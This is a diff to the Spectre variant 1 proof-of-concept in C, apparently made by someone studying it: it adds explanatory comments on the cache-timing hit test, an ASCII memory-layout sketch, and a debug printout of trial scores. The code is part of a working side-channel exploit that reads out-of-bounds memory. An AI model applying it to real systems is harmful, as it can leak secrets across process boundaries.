@@ -104,12 +104,22 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2],
       time2 = __rdtscp(&junk) - time1; /* Compute elapsed time */
       // end read and time
 
-      // delta indicates cache hit
-      // &&
-      // mix_i [0,256) != array1[ [0,999) mod 16 ]
-      // ^ what does this mean? The 
+      /*
+       * small delta indicates cache hit
+       * &&
+       * mix_i [0,256) != array1[ [999,0) mod 16 ]
+       * ^ what does this mean?
+       *    array1[tries % array1_size] will be a value [1,16]
+       *      why cant our mix_i count if the tries % array1_size
+       *        is the same? victim_function(x) is based off of tries
+       *        I am ASSUMING that this value happens to still be
+       *        cached; training_x = tries % array1_size.
+       *
+       * |secret.........|                   |array1...........|
+       *
+       *          |probeArray................|
+       */
       if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
-        //      bklcount++;
         results[mix_i]++; /* cache hit -> score +1 for this value */
     }
 
@@ -130,10 +140,10 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2],
   }
 
   // whats in results? should be results of 1000 trials
-  //  printf("Trial Results:\n");
-  //  for (i = 0; i < 256; i++) {
-  //    printf("res %c: %d\n",i,results[i]);
-  //  }
+  printf("Trial Results:\n");
+  for (i = 0; i < 256; i++) {
+  printf("res %d: %d\n",i,results[i]);
+  }
   //printf("%d\n",bklcount);
 
   /* use junk to prevent code from being optimized out */
